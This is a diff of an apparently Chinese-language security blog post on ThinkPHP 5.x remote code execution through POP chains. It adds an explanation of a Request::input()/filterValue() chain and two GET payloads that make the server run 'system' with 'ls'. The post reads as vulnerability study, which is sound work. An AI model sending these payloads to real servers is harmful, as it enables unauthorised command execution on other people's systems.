@@ -249,32 +249,37 @@
                     <img class="img-fluid" src="../img/2021-5-23/pop-20.jpg" alt="">
                 </a>
                 
-                
-                
-                
-                
 
-
-                
-
-
-
-
-
-
-
-
-
-
-
-
-                <h2 class="section-heading">POP</h2>
+                <h2 class="section-heading">POP-1</h2>
 
                 <div>
 
                     <pre class='hljs'><code>GET: s=index/think\App/invokeFunction&amp;function=call<span class="hljs-emphasis">_user_</span>func_array&amp;vars[<span class="hljs-link_label">0</span>]=system&amp;vars[<span class="hljs-link_label">1</span>][<span class="hljs-link_reference"></span>]=ls</code></pre>
 
                 </div>
+                
+                <p>&nbsp;&nbsp;&nbsp;既然这里通过路由可以实例化类跟调用方法，那么只要找到其它触发点即可构成POP链。
+                	回到TP5.0.x的rce链，找到thinkphp/library/think/Request.php::input()。</p>
+                	                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-23/pop-2-1.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;进入filterValue()方法后，触发call_user_func($filter, $value)命令执行。</p>
+                	                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-23/pop-2-2.jpg" alt="">
+                </a>
+                
+
+
+								<h2 class="section-heading">POP-2</h2>
+								
+								<div>
+									
+									<pre class='hljs'><code>GET: s=index/\think\request/input?data[]=<span class="hljs-keyword">ls</span>&amp;<span class="hljs-keyword">filter</span>=<span class="hljs-keyword">system</span></code></pre>
+									
+								</div>
 
 
                 <h2 class="section-heading">There Is Nothing Below</h2>
